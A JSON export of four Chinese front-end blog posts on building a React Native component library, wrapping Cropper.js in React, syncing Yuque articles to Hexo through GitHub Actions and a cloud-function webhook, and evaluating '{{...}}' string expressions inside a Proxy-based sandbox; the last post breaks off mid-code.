[{"title":"React Native 组件库 - 脚手架","path":"/2023/02/06/yuque/React Native 组件库 - 脚手架/","content":"作为一个前端 er，谁不想拥有一个自己的组件库。我也想，所以它来了 - rn-vant，使用 vant 设计规范的 React Native 组件库。 组件库目前已经拥有了 40+ 组件（虽然还是很简陋，bug 也是一堆，主要还是我太懒了 😅），也算圆了我的一个梦想，现在是时候做个阶段总结了，将这段时间开发遇到的问题都记录下来，一方面是怕自己忘了，另一方面也是给看到这系列文件的朋友做个参考。 Mono or Multi Repo from https://juejin.cn/post/6949882490324516894#heading-9 这里简单解释下什么是 MonoRepo 以及 MultiRepo，以及他们的优缺点： MonoRepo：把多个项目放在一个仓库里面管理。 MultiRepo：每个项目都对应着一个单独的代码仓库每个项目进行分散管理。 MonoRepo 优缺点： 优点： 统一了工作流：由于所有的项目放在一个仓库当中，复用起来非常方便，如果有依赖的代码变动，那么用到这个依赖的项目当中会立马感知到 降低基建成本：所有项目复用一套标准的工具和规范，无需切换开发环境，如果有新的项目接入，也可以直接复用已有的基建流程，比如 CI 流程、构建和发布流程。 提升团队协作效率：一方面大家都在一个仓库开发，能够方便地共享和复用代码，方便检索项目源码，另一方面，git commit 的历史记录也支持以功能为单位进行提交，之前对于某个功能的提交，需要改好几个仓库，提交多个 commit，现在只需要提交一次，简化了 commit 记录，方便协作。 缺点： 体积问题：因为所有 code 都在一个 repo 下，这就导致了随着项目越来越复杂，整个 repo 的体积会变得很大。据说某大公司员工想要修改项目中的某个小样式，需要将数以十 G 的 repo 拉到本地，听起来确实是个噩梦。 权限问题：Monorepo 模式下的权限是开放的。代码安全，文档安全，都会是一个需要好好考虑的问题。这个方面如果处理不好的话，对整个团队整个项目带来的后果可能是灾难性的。 版本控制：仓库变得太大，对版本控制技术会有很大的挑战。因为 Git 社区建议的是使用更多更小的代码库，Git 本身并不适合单个巨大的代码库。 Monorepo 和 Multirepo 都是管理组织代码的方式，并没有什么优劣之分，还是那句话“存在即合理”，工具都是用来服务生产的，能更有效解决当下问题的，就是更好的。回到组件库上，按照最初的规划，组件库最少会产出两个 npm 包，组件库本体和 icon 组件，并且组件库会依赖 icon 组件，自然采用 Monorepo 的方式是最好的。 Monorepo 工具既然选择了 Monorepo，自然就需要看看社区里有哪些好的 Monorepo 工具： Bit：用于组件驱动开发的工具链 Turborepo：用于 JavaScript 和 TypeScript 代码库的高性能构建系统。 Rush：一个可扩展的 web 单仓库管理器。 Nx：具有一流的 monorepo 支持和强大集成的下一代构建系统。 Lerna：用于管理包含多个软件包的项目 上面这些工具中，我最熟悉的就是 Lerna 了，简单而不简陋，完全能够胜任组件库编排的工作，因此首选 Lerna 了。（性能确实不如其他的工具，比如 Turborepo，但是目前也并没有太大的性能诉求，以后遇到了，可以在迁移） 组件库构建工具我们的组件库最终是需要发布到 npm 上的，因为组件库的运行环境不在浏览器中，因此只需要提供 ES Module和 CommonJS模块的组件即可，另外如果是 Typescript 工程，构建时还需要输出类型文件，在调研社区开源的组件库会锁定一个工具 - react-native-builder-bob 安装 react-native-builder-bob: 1yarn add react-native-builder-bob -D 配置及使用都很简单，在 package.json 中新增如下配置： 12345678910111213141516171819&#123; &quot;scripts&quot;: &#123; &quot;build&quot;: &quot;bob build&quot; &#125;, &quot;react-native-builder-bob&quot;: &#123; &quot;source&quot;: &quot;src&quot;, &quot;output&quot;: &quot;lib&quot;, &quot;targets&quot;: [ &quot;commonjs&quot;, &quot;module&quot;, [ &quot;typescript&quot;, &#123; &quot;project&quot;: &quot;tsconfig.build.json&quot; &#125; ] ] &#125;&#125; 运行 yarn build后，会在 lib 目录下生成相应模块的文件： 最后在 package.json 中，添加这些模块的入口说明： 1234567&#123; &quot;main&quot;: &quot;lib/commonjs/index&quot;, &quot;module&quot;: &quot;lib/module/index&quot;, &quot;types&quot;: &quot;lib/typescript/index.d.ts&quot;, &quot;react-native&quot;: &quot;src/index&quot;, &quot;source&quot;: &quot;src/index&quot;&#125; 代码质量 and 代码风格代码质量目前只配置了 eslint，后面如果有更好的工具，可以尝试接入。现在使用的是 https://github.com/youngjuning-archive/eslint-config 这个，主要看中它将 prettier 和 eslint 集成到一起了，省了自己配置（prettier 和 eslint 有些规则是冲突的，解决起来超级麻烦），而且 eslint 的规则来自 airbnb，代码质量也有了保障。 代码风格用的是 prettier，因为已经集成到 @youngjuning/eslint-config了，只需要安装 @youngjuning/prettier-config，并简单配置下就能使用了。 12// .prettierrc.jsmodule.exports = require(&quot;@youngjuning/prettier-config&quot;); 除了 eslint 和 prettier，我们还能借助一些工具，来帮助我们更好的组织代码： husky：管理 git hook 的工具，可以在 git commit 时，强制校验和格式化代码。 lint-staged：针对 git 暂存文件执行一些脚本，结合 husky 可以实现只对改动的文件，校验和格式化，毕竟改一行代码就要校验整个仓库成本还是太高了。 commitlint：git commit messages 风格校验工具。 至于如何在 lerna 项目中如何集成这些工具，可以看我的另一篇博客 【lerna 项目中集成 husky、lint-staged、commitlint 和 cz-customizable】，里面做了详细的说明。 总结本文主要介绍了开发一个组件库需要的一些工具的选型，实际上这些工具熟悉前端工程化的同学都不会陌生，具体的配置可以参考我的组件库项目 - rn-vant。后面我会再介绍下组件方的文档及 CI&#x2F;CD 的相关配置。"},{"title":"Cropper.js 实践","path":"/2023/02/02/yuque/Cropper.js 实践/","content":"背景前段时间接了个需求，需要做个图片上传，预览及裁切服务，调研了下社区的开源方案，cropperjs 进入视野，简单看了下 README，完美符合我的需求，最终实现效果如下： 安装没啥好说的，直接 yarn 走起： 1yarn add cropperjs 引入 CSS 文件： 1import &quot;cropperjs/dist/cropper.css&quot;; 封装简单的分析下需求，整个图片裁切包含以下几个部件： 图片裁切框 - 包含「网页端」和「移动端」，需要分开裁切 替换图片按钮 - 替换图片后，「网页端」和「移动端」都需要替换 图片预览 - 同样「网页端」和「移动端」也需要分开预览 Cropper.js 是个原生的裁切库，在我们的 React 项目中按照上面的功能划分封装成以下几个组件： Upload.tsx 12345678910111213141516171819202122232425262728293031323334353637383940import React, &#123; useContext, memo &#125; from &quot;react&quot;;import &#123; Upload as PDUpload &#125; from &quot;@universe-design/react&quot;;import &#123; CropperContext &#125; from &quot;./Context&quot;;type UploadProps = &#123; maxSize?: number; children?: React.ReactNode; accept?: string;&#125;;export const Upload = memo((props: UploadProps): JSX.Element =&gt; &#123; const &#123; accept = &quot;image/*&quot;, maxSize &#125; = props; const &#123; setSrc &#125; = useContext(CropperContext); const beforeUpload = (file: File) =&gt; &#123; // 检查文件大小 if (file.size &amp;&amp; maxSize &amp;&amp; file.size &gt; maxSize) &#123; return PDUpload.LIST_IGNORE; &#125; const reader = new FileReader(); reader.onload = () =&gt; &#123; setSrc?.(reader.result as string); &#125;; reader.readAsDataURL(file); return false; &#125;; return ( &lt;PDUpload maxCount=&#123;1&#125; beforeUpload=&#123;beforeUpload&#125; fileList=&#123;[]&#125; accept=&#123;accept&#125; &gt; &#123;props.children&#125; &lt;/PDUpload&gt; );&#125;); 这个组件的功能很简单，就是使用组件库的上传组件获取文件的 base64，然后保存到 context 里，方便裁切组件消费。 Context.tsx 12345678910111213141516171819202122232425262728293031323334import React, &#123; createContext, FC, useMemo, useState, useRef &#125; from &quot;react&quot;;import &#123; uniqueId &#125; from &quot;lodash&quot;;export interface CropperState &#123; src?: string | undefined; setSrc: (src: string) =&gt; void; previewClass: string;&#125;export interface CropperProviderProps &#123; src?: string | undefined;&#125;export const CropperContext = createContext&lt;CropperState&gt;(&#123;&#125; as CropperState);export const CropperProvider: FC&lt;CropperProviderProps&gt; = (props) =&gt; &#123; const [src, setSrc] = useState(props.src); const previewClass = useRef(uniqueId(&quot;image_preview_&quot;)); const contextState = useMemo&lt;CropperState&gt;( () =&gt; (&#123; src, setSrc, previewClass: previewClass.current, &#125;), [src] ); return ( &lt;CropperContext.Provider value=&#123;contextState&#125;&gt; &#123;props.children&#125; &lt;/CropperContext.Provider&gt; );&#125;; Prview.tsx 1234567891011121314151617181920212223242526import React, &#123; useContext, memo &#125; from &quot;react&quot;;import classnames from &quot;classnames&quot;;import &#123; CropperContext &#125; from &quot;./Context&quot;;import styles from &quot;./index.less&quot;;export interface PreviewProps extends React.HTMLAttributes&lt;HTMLDivElement&gt; &#123; name?: string;&#125;export const Preview: React.FC&lt;PreviewProps&gt; = memo((props) =&gt; &#123; const &#123; name = &quot;default&quot;, className, children, ...rest &#125; = props; const &#123; previewClass &#125; = useContext(CropperContext); return ( &lt;div &#123;...rest&#125; className=&#123;classnames( `$&#123;previewClass&#125;-$&#123;name&#125;`, styles[&quot;image-preview&quot;], className )&#125; &gt; &#123;children&#125; &lt;/div&gt; );&#125;); 预览组件本身也不复杂，就是需要注意的是，Cropper.js 的 preview 参数可以是个元素，元素数组或者能够被 Document.querySelectorAll 选中的 class 选择器，因为封装成了通用组件，因此使用了 lodash 的 uniqueId 方法生成唯一的 class，防止页面出现多个 Prview 组件时，class 类名冲突。 Cropper.tsx 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125import React, &#123; useContext, memo, useRef, useEffect &#125; from &quot;react&quot;;import Cropper from &quot;cropperjs&quot;;import &#123; useMemoizedFn, useInViewport, useUpdateLayoutEffect &#125; from &quot;ahooks&quot;;import classnames from &quot;classnames&quot;;import &quot;cropperjs/dist/cropper.css&quot;;import &#123; CropperContext &#125; from &quot;./Context&quot;;import styles from &quot;./index.less&quot;;type CropperOptions = Cropper.Options&lt;HTMLImageElement&gt;;type ReactCropperProps = Pick&lt;CropperOptions, &quot;aspectRatio&quot;&gt; &amp; &#123; name?: string; style?: React.CSSProperties; className?: string; alt?: string; src?: string; data?: Cropper.Data; onCrop?: (data: Cropper.Data) =&gt; void; // 监听裁切框的变动&#125;;interface ReactCropperElement extends HTMLImageElement &#123; cropper: Cropper;&#125;export type ReactCropperRef = Cropper;const REQUIRED_IMAGE_STYLES = &#123; opacity: 0, maxWidth: &quot;100%&quot; &#125;;const ReactCropper = React.forwardRef&lt;ReactCropperRef, ReactCropperProps&gt;( (props, ref) =&gt; &#123; const &#123; name = &quot;default&quot;, style, className, alt = &quot;picture&quot;, aspectRatio, data, onCrop, &#125; = props; const boxRef = useRef&lt;HTMLDivElement&gt;(null); const combinedRef = useRef&lt;ReactCropperElement&gt;(null); const cropperState = useContext(CropperContext); // 是否在可是区域内 const [inViewport] = useInViewport(boxRef); const src = cropperState?.src || props?.src; const preSrc = useRef&lt;string | undefined&gt;(src); const preview = `.$&#123;cropperState.previewClass&#125;-$&#123;name&#125;`; React.useImperativeHandle(ref, () =&gt; combinedRef.current!.cropper); /** * 满足以下条件才能重新 render * 1. src 地址变更 * 2. 在可是区域内（如果不在可视区域，render 时会出问题） */ useEffect(() =&gt; &#123; if ( combinedRef.current?.cropper &amp;&amp; typeof src !== &quot;undefined&quot; &amp;&amp; inViewport &amp;&amp; src !== preSrc.current ) &#123; combinedRef.current.cropper.reset().clear().replace(src); preSrc.current = src; &#125; &#125;, [inViewport, src]); const handleCrop = useMemoizedFn(() =&gt; &#123; if (combinedRef.current?.cropper) &#123; onCrop?.(combinedRef.current?.cropper.getData()); &#125; &#125;); useUpdateLayoutEffect(() =&gt; &#123; data &amp;&amp; combinedRef.current?.cropper.setData(data); &#125;, [data]); useUpdateLayoutEffect(() =&gt; &#123; aspectRatio &amp;&amp; combinedRef.current?.cropper.setAspectRatio(aspectRatio); &#125;, [aspectRatio]); useEffect(() =&gt; &#123; if (combinedRef.current !== null) &#123; // eslint-disable-next-line no-new new Cropper(combinedRef.current, &#123; viewMode: 1, // 限制裁剪框不能超出图片的范围 dragMode: &quot;crop&quot;, // 拖拽图片时形成新的裁剪框 guides: true, // 是否显示裁剪框的虚线 scalable: false, // 是否可以缩放图片（可以改变长宽） zoomable: false, // 是否可以缩放图片（改变焦距） zoomOnTouch: false, // 是否可以通过拖拽触摸缩放图片 zoomOnWheel: false, // 是否可以通过鼠标滚轮缩放图片 center: false, // 是否显示裁剪框中间的 ‘+’ 指示器 responsive: false, // 是否在窗口尺寸调整后 进行响应式的重渲染 movable: false, // 是否可以移动图片 preview, aspectRatio, // 设置裁剪框为固定的宽高比 data, // 之前存储的裁剪后的数据 在初始化时会自动设置 crop: handleCrop, &#125;); &#125; return () =&gt; &#123; combinedRef.current?.cropper?.destroy(); &#125;; // eslint-disable-next-line react-hooks/exhaustive-deps &#125;, [preview, handleCrop]); return ( &lt;div style=&#123;style&#125; className=&#123;classnames(styles.cropper, className)&#125; ref=&#123;boxRef&#125; &gt; &lt;img src=&#123;src&#125; alt=&#123;alt&#125; style=&#123;REQUIRED_IMAGE_STYLES&#125; ref=&#123;combinedRef&#125; /&gt; &lt;/div&gt; ); &#125;);export default memo(ReactCropper); 最后就是重头戏的 Cropper 了，组件内部封装了 Cropper.js 初始化逻辑，图片切换的逻辑。 index.tsx 123456789101112131415import CropperInner from &quot;./Cropper&quot;;import &#123; CropperProvider &#125; from &quot;./Context&quot;;import &#123; Upload &#125; from &quot;./Upload&quot;;import &#123; Preview &#125; from &quot;./Preview&quot;;export * from &quot;./Cropper&quot;;export * from &quot;./Context&quot;;const Cropper = Object.assign(CropperInner, &#123; Upload, Provider: CropperProvider, Preview,&#125;);export default Cropper; 最后就是将这些组件全部挂载到 Cropper，对外只暴露 Cropper 这一个组件。 使用使用封装后的 Cropper 组件大概如下，其中 Cropper 组件和 Cropper.Preview 组件可以有任意多个，但是需要注意，两个组件的 name 字段要一一对应，否则会出现无法实时预览的情况。 123456789101112131415161718192021222324252627import Cropper from &quot;./Cropper&quot;;export default () =&gt; &#123; return ( &lt;Cropper.Provider src=&quot;xxxxx&quot;&gt; // 裁切组件 &lt;Cropper aspectRatio=&#123;PC_CROP_RATIO&#125; name=&quot;PC&quot; ref=&#123;(ref) =&gt; setRef(ref!, TYPE.web)&#125; className=&#123;styles[&quot;container-cropper&quot;]&#125; onCrop=&#123;(data) =&gt; handleCrop(data, TYPE.web)&#125; data=&#123;cacheValue.current?.tailored_info?.web&#125; /&gt; // 上传组件 &lt;Cropper.Upload accept=&#123;UPLOAD_ACCEPT&#125; maxSize=&#123;UPLOAD_MAX_SIZE&#125;&gt; &lt;Button type=&quot;link&quot;&gt;&#123;i18next.t(&quot;replace-image&quot;)&#125;&lt;/Button&gt; &lt;/Cropper.Upload&gt; // 预览组件 &lt;Cropper.Preview style=&#123;bannerStyle&#125; className=&#123;styles[&quot;preview-mobile&quot;]&#125; name=&quot;mobile&quot; /&gt; &lt;/Cropper.Provider&gt; );&#125;; 样式覆盖组件逻辑解决了，现在解决样式问题。我们之前引入了 cropperjs 的默认样式文件，现在只需要覆盖掉它的样式就可以了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960// 复写 Cropper 的样式.cropper &#123; :global &#123; .cropper-modal &#123; opacity: 0.4; &#125; .cropper-line &#123; background-color: #fff; &#125; .cropper-point &#123; &amp;.point-e, &amp;.point-n, &amp;.point-w, &amp;.point-s &#123; display: none; &#125; &amp;.point-ne, &amp;.point-nw, &amp;.point-sw, &amp;.point-se &#123; width: 20px; height: 20px; background: transparent; opacity: 1; &#125; &amp;.point-nw, &amp;.point-ne &#123; border-top: 3px solid #fff; &#125; &amp;.point-nw, &amp;.point-sw &#123; border-left: 3px solid #fff; &#125; &amp;.point-ne, &amp;.point-se &#123; border-right: 3px solid #fff; &#125; &amp;.point-sw, &amp;.point-se &#123; border-bottom: 3px solid #fff; &#125; &#125; .cropper-view-box &#123; outline-color: #fff; &#125; .cropper-dashed &#123; border-style: solid; opacity: 1; &#125; &#125;&#125; 问题 获取裁切后图片 blob 图片裁切，需要获取裁切图片的 blob 上传到 CDN，Cropperjs 提供了获取 blob 的方法： 1cropper.getCroppedCanvas().toBlob((blob) =&gt; &#123;&#125;) 但是在我们业务的场景下，同时会存在两个裁切框分别用来裁切「网页端」和「移动端」，用的都是同一个图片，也就是说替换图片会同时替换「网页端」和「移动端」的图片。这就导致了替换图片后，只有当前激活的 tab 下的 cropper 调用 getCroppedCanvas 才能获取到替换图片后的数据，没有激活的 tab 下还是获取旧图片的数据。 复现路径：除非在提交前，手动切换到移动端的 tab，不然该问题会一直存在，这是 cropperjs 内部实现的问题，我们不能要求用户多这么一个无意义的步骤，因此我们自己实现 「getCroppedCanvas」方法，不用 cropperjs 暴露的方法 1234567891011121314151617181920212223242526272829// 使用 canvas 裁切图片export const cropImage = (source: string, options: Options) =&gt; &#123; const &#123; width, height, x, y &#125; = options; const canvas = document.createElement(&quot;canvas&quot;); const context = canvas.getContext(&quot;2d&quot;)!; const image = new Image(); image.src = source; image.crossOrigin = &quot;anonymous&quot;; return new Promise&lt;HTMLCanvasElement&gt;((resolve) =&gt; &#123; image.onload = () =&gt; &#123; const [px, py, pw, ph] = [ inRange(x, 0, image.width) ? x : 0, inRange(y, 0, image.height) ? y : 0, inRange(width, 0, image.width) ? width : image.width, inRange(height, 0, image.height) ? height : image.height, ].map((param) =&gt; Math.floor(normalizeDecimalNumber(param))); canvas.width = pw; canvas.height = ph; context.imageSmoothingEnabled = true; context.imageSmoothingQuality = &quot;low&quot;; context.drawImage(image, px, py, pw, ph, 0, 0, pw, ph); context.restore(); resolve(canvas); &#125;; &#125;);&#125;;"},{"title":"语雀同步到 Github Hexo","path":"/2023/01/31/yuque/语雀同步到 Github Hexo/","content":"背景我的博客都是用 Hexo 在本地写完，提交个 commit 到 Github，触发 Github Action 自动部署到 Github Page 上。除了用 Vscode 写 Markdown 有点难受外，其它地方还好，至于为什么一定要用 Hexo + Github 的组合，白嫖 Github 的服务器它不香吗？ 但是，最近体验了下语雀，发现他的文本编辑器还是很不错的，写文档很是丝滑，正好在 Github 上发现了个项目 - https://github.com/x-cold/yuque-hexo，可以将语雀的文章同步到 Hexo 中，是时候改变下博客写作流程了。下面就记录了整个迁移过程。 安装及配置 yuque-hexo在 hexo 项目的根目录中执行以下命令，安装 yuque-hexo： 1yarn add yuque-hexo -D 1. 新增配置：123456789101112131415161718192021&#123; &quot;yuqueConfig&quot;: &#123; &quot;postPath&quot;: &quot;source/_posts/yuque&quot;, &quot;cachePath&quot;: &quot;yuque.json&quot;, &quot;mdNameFormat&quot;: &quot;title&quot;, &quot;adapter&quot;: &quot;hexo&quot;, &quot;concurrency&quot;: 5, &quot;baseUrl&quot;: &quot;https://www.yuque.com/api/v2&quot;, &quot;login&quot;: &quot;bijinfeng-fyjgs&quot;, &quot;repo&quot;: &quot;blog&quot;, &quot;onlyPublished&quot;: true, &quot;onlyPublic&quot;: false, &quot;imgCdn&quot;: &#123; &quot;concurrency&quot;: 0, &quot;imageBed&quot;: &quot;upyun&quot;, &quot;enabled&quot;: true, &quot;bucket&quot;: &quot;xxxx&quot;, &quot;prefixKey&quot;: &quot;yuque&quot; &#125; &#125;&#125; yuqueConfig 中每个字段的作用在 yuque-hexo 的 README 中都有说明，我这里挑几个重点的说下： login - 个人路径 repo - 知识库路径 2. 新增脚本这些脚本主要用在后面的 Github Action 中，当然也方便本地调试使用 1234567&#123; &quot;scripts&quot;: &#123; &quot;clean:yuque&quot;: &quot;yuque-hexo clean&quot;, &quot;sync&quot;: &quot;yuque-hexo sync&quot;, &quot;reset&quot;: &quot;npm run clean:yuque &amp;&amp; npm run sync&quot; &#125;&#125; 配置 Github Action在修改 Github Action 配置文件前，我们先需要获取几个 Token： YUQUE_TOKEN 新增或使用现有的 Token，Token 给个读取权限就行了 SECRET_ID &#x2F; SECRET_KEY 图床相关的密钥，我用的是又拍云，需要操作员的账号和密码（密码忘了的话，点击编辑按钮，重新生成个） 在 Github 项目的 Setting 中新增三个环境变量 上面的变量都准备好后，来到 hexo 项目的 .github&#x2F;workflows 目录，新增个 deploy.yml 文件: 123456789101112131415161718192021222324252627282930313233343536name: Build and Deployon: push: branches: - masterjobs: build-and-deploy: environment: github-pages env: yuque_token: $&#123;&#123; secrets.YUQUE_TOKEN &#125;&#125; secret_id: $&#123;&#123; secrets.SECRET_ID &#125;&#125; secret_key: $&#123;&#123; secrets.SECRET_KEY &#125;&#125; runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@master with: submodules: true - name: Install Dependencies run: yarn install - name: Sync Yuque run: YUQUE_TOKEN=$&#123;&#123; env.yuque_token &#125;&#125; SECRET_ID=$&#123;&#123; env.secret_id &#125;&#125; SECRET_KEY=$&#123;&#123; env.secret_key &#125;&#125; yarn sync - name: Generate run: yarn build - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: github_token: $&#123;&#123; secrets.ACCESS_TOKEN &#125;&#125; publish_dir: ./public 或者你的项目中原本就有 Action 的配置，现在只需要增加 yuque-hexo 的相关配置就行： 消费上面设置的环境变量 注意 environment 字段必须和你在 Github Setting 中配置的 Environments 字段对应上 12345environment: github-pages env: yuque_token: $&#123;&#123; secrets.YUQUE_TOKEN &#125;&#125; secret_id: $&#123;&#123; secrets.SECRET_ID &#125;&#125; secret_key: $&#123;&#123; secrets.SECRET_KEY &#125;&#125; 在运行 hexo generate 之前，先同步语雀的文章 12- name: Sync Yuque run: YUQUE_TOKEN=$&#123;&#123; env.yuque_token &#125;&#125; SECRET_ID=$&#123;&#123; env.secret_id &#125;&#125; SECRET_KEY=$&#123;&#123; env.secret_key &#125;&#125; yarn sync 到这里 yueque-hexo 的配置工作就完成了，保存，提交 commit 到 GitHub 上触发 Action，如果一切顺利的话语雀的文章就会同步过来。 主动同步上面的动作完成后，我们虽然能够同步语雀的文章，但是我们在语雀写完文章后，还需要到 github 上手动触发下 Action，体验还是不够完美，为了解决这个问题，我们有两个方案： 定义任务给 Action 添加个定时任务，在每天的 2:00 同步一次语雀 123on: schedule: - cron: &quot;0 2 * * *&quot; webhook 在语雀写完文章后，自动触发个 webhook，启动 Github Action 同步文章 使用 API 远程触发 Github Action 现在 Action 只能在提交 commit 后触发，新增个配置，让 Action 支持被 api 触发： 123456789on: push: branches: - master # 允许外部仓库事件触发 repository_dispatch: types: # 这里的值需要和下文的云函数的event_type保持一致 - webhook 访问链接页面 https://github.com/settings/tokens/new 申请一个 Token，需要勾选 repo 权限。 API 调用格式 12345curl -X POST https://api.github.com/repos/:owner/:repo/dispatches \\ -H &quot;Accept: application/vnd.github.everest-preview+json&quot; \\ -H &quot;Authorization: token TRIGGER_TOKEN&quot; \\ --data &#x27;&#123;&quot;event_type&quot;: &quot;TRIGGER_EVENT&quot;&#125;&#x27; 其中，owner 是用户名，repo 是仓库名， TRIGGER_TOKEN 是上面申请的 Token 凭证，TRIGGER_EVENT 是自定义的事件名。 若是语雀支持自定义 webhook 格式，那么本文到这里就要结束了，可惜天公不作美，语雀只支持配置个接口 URL。那么我们就需要借助云函数来倒一手了，代理后的调用路径变成：语雀 webhook -&gt; 云函数 -&gt; gtihub api。 云函数 我这里使用的是腾讯云函数，其它云服务商的云函数只能自己探索了。 新建个云函数，我们只要做个接口转发，不用那么麻烦就不用模板了（作为前端 er 当然首选 node）： 下面编辑云函数: 123456789101112131415161718192021222324252627282930&quot;use strict&quot;;const request = require(&quot;request&quot;);exports.main_handler = async (event, context) =&gt; &#123; const res = await new Promise((resolve, reject) =&gt; &#123; request( &#123; url: &quot;https://api.github.com/repos/:owner/:repo/dispatches&quot;, method: &quot;POST&quot;, json: true, headers: &#123; &quot;User-Agent&quot;: &quot;curl/7.52.1&quot;, &quot;Content-Type&quot;: &quot;application/json&quot;, Authorization: &quot;token xxxxx&quot;, Accept: &quot;application/vnd.github.everest-preview+json&quot;, &#125;, body: &#123; event_type: &quot;webhook&quot; &#125;, &#125;, function (error, response, body) &#123; if (response.status_code == 204) &#123; resolve(response); &#125; else &#123; reject(error); &#125; &#125; ); &#125;); return res;&#125;; 触发器设置，触发方式选择「API 网关触发」，其它默认： 创建成功后，腾讯云会提供个公网访问路径，将其配置到知识库的「消息推送」设置中： 发布文章现在，在发布和更新文章后，即可触发 Action。 注意事项 不要开启自动发布，否则无法触发 webhook"},{"title":"JS - 字符串函数表达式","path":"/2023/01/30/yuque/JS - 字符串函数表达式/","content":"最近在做一个需要，需要实现一个字符串形式的“函数表达式”，以双括号”{{…}}”为语法特征。例如： 123&#123;\ttitle：&quot;&#123;&#123;formData.x.y === &#x27;us&#x27; ? &#x27;美元&#x27;:&#x27;人民币&#x27;&#125;&#125;&quot;&#125; 并且函数表达式内置了一些关键词： $self - 代表当前字段实例，用来获取当前字段的值和 schema 配置 $values - 代表整个表单数据 $form - 代表当前 Form 实例，可以用来触发表单校验等操作 $deps - 获取 dependencies 中依赖项的值，和 dependencies 顺序一致 $fetch - 使用封装的 request 方法，发送 http 请求 使用了关键词的表达式如下： 123&#123; select_options: &quot;&#123;&#123;$self.select_options.map(item =&gt; (&#123; ...item, disabled: $deps[0].map(it =&gt; it.bank_card_usage).includes(item.value) &#125;))&#125;&#125;&quot;;&#125; 函数表达式可能由后端下发或者用户输入，因此为防止 XSS 注入，函数表达式的作用域需要限制下。 实现new Function 语法 引用自： 实现函数表达式之前，我们先复习下 new Function 语法： 1let func = new Function([arg1, arg2, ...argN], functionBody); 最后一个参数一定是函数体，其余参数都作为传给函数体的参数。例如： 123let sum = new Function(&quot;a&quot;, &quot;b&quot;, &quot;return a + b&quot;);console.log(sum(1, 2)); // 结果是 3 平常进行 JS 或者 Node.js 开发的时候，我们是没有任何理由使用 new Function 构造函数的，因为没必要，直接使用 function 或者 () &#x3D;&gt; {} 箭头函数写法就好了。 那是不是表示 new Function 语法是个鸡肋特性呢？ 不！绝不是！ new Function 语法有个特别厉害的特性，使其成为 JavaScript 这门语言中无可替代的重要角色。。 什么特性呢？ 那就是函数体的数据格式是字符串，这可是个不得了的东西啊！ 解析函数表达式利用 new Function 的语法特性，我们就可以将字符串变成可执行的代码： 12345const compile = (expression: string, scope = &#123;&#125;) =&gt; &#123; return new Function(&quot;$root&quot;, `with($root) &#123; return ($&#123;expression&#125;); &#125;`)( scope );&#125;; compile 函数有两个参数，第一个参数为要执行的字符串表达式，第二个参数为执行时的作用域，将 $self 等内置关键词传入 scope 供函数执行时调用。 compile 实现时使用了 with 关键词，帮助我们简化代码，如果不使用 with 关键词，scope 里所有的元素都需要依次传入 new Function 中： 12345const compile = (expression, scope = &#123;&#125;) =&gt; &#123; const keys = Object.keys(scope); const values = keys.map((key) =&gt; scope[key]); return new Function(...keys, `return ($&#123;expression&#125;);`)(...values);&#125;; 不过，with 在性能和语义方面都有些问题（具体问题见：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/with），至于用不用，自己考虑吧 限制作用域现在字符串得以执行了，接下来需要解决的就是函数的作用域问题了。 由 Function 构造函数创建的函数不会创建当前环境的闭包，它们总是被创建于全局环境，因此在运行时它们只能访问全局变量和自己的局部变量，不能访问它们被 Function 构造函数创建时所在的作用域的变量。 12345678910111213141516171819var x = 10;function createFunction1() &#123; var x = 20; return new Function(&quot;return x;&quot;); // 这里的 x 指向最上面全局作用域内的 x&#125;function createFunction2() &#123; var x = 20; function f() &#123; return x; // 这里的 x 指向上方本地作用域内的 x &#125; return f;&#125;var f1 = createFunction1();console.log(f1()); // 10var f2 = createFunction2();console.log(f2()); // 20 因此，如果仅仅是限制表达式访问创建时所在的作用域的变量，new Function 就足够了，如果还想要限制访问全局作用域，那么就要实现一个沙箱了。 沙箱 引用自： 什么是沙箱？在计算机安全中，沙箱（Sandbox）是一种用于隔离正在运行程序的安全机制，通常用于执行未经测试或不受信任的程序或代码，它会为待执行的程序创建一个独立的执行环境，内部程序的执行不会影响到外部程序的运行。 常见的沙箱应用场景： 执行 JSONP 请求回来的字符串时或引入不知名第三方 JS 库时，可能需要创造一个沙箱来执行这些代码。 Vue 模板表达式的计算是运行在一个沙盒之中的，在模板字符串中的表达式只能获取部分全局对象，这一点官方文档有提到，详情可参阅源码。 在线代码编辑器，如 CodeSanbox 等在线代码编辑器在执行脚本时都会将程序放置在一个沙箱中，防止程序访问&#x2F;影响主页面。 够用的沙箱实现：Proxy 中的 get 和 set 方法只能拦截已存在于代理对象中的属性，对于代理对象中不存在的属性这两个钩子是无感知的。因此这里我们使用 Proxy.has() 来拦截 with 代码块中的任意变量的访问，并设置一个白名单，在白名单内的变量可以正常走作用域链的访问方式，不在白名单内的变量会继续判断是否存在沙箱自行维护的上下文对象中，存在则正常访问，不存在则直接报错。 1234567891011121314151617181920212223242526272829303132333435363738394041424344const withedCode = (code: string) =&gt; &#123; return new Function(&quot;$root&quot;, `with($root) &#123; return ($&#123;code&#125;); &#125;`);&#125;;// 可访问全局作用域的白名单列表const access_white_list = [&quot;Math&quot;, &quot;Date&quot;];const Sandbox = (code: string, scope = &#123;&#125;) =&gt; &#123; // 执行上下文对象的代理对象 const scopeProxy = new Proxy(scope, &#123; has: (target, prop) =&gt; &#123; // has 可以拦截 with 代码块中任意属性的访问 if (access_white_list.includes(prop)) &#123; // 在可访问的白名单内，可继续向上查找 return target.hasOwnProperty(prop); &#125; if (!target.hasOwnProperty(prop)) &#123; throw new Error(`Invalid expression - $&#123;prop&#125;! You can not do that!`); &#125; return true; &#125;, &#125;); withedCode(code).call(scopeProxy, scopeProxy);&#125;;// 执行上下文对象const scope = &#123; func: (variable) =&gt; &#123; console.log(variable); &#125;, foo: &quot;foo&quot;,&#125;;// 待执行程序const code = ` Math.random() location.href = &#x27;xxx&#x27; func(foo)`;console.log(Sandbox(code, scope)); 最终实现版本12345678910111213141516171819202122232425262728293031323334353637const scope = &#123; $self: &quot;xxxx&quot;,&#125;;const ExpRE = /^\\s*\\&#123;\\&#123;([\\s\\S]*)\\&#125;\\&#125;\\s*$/;const withedCode = (code: string) =&gt; &#123; return new Function(&quot;$root&quot;, `with($root) &#123; return ($&#123;code&#125;); 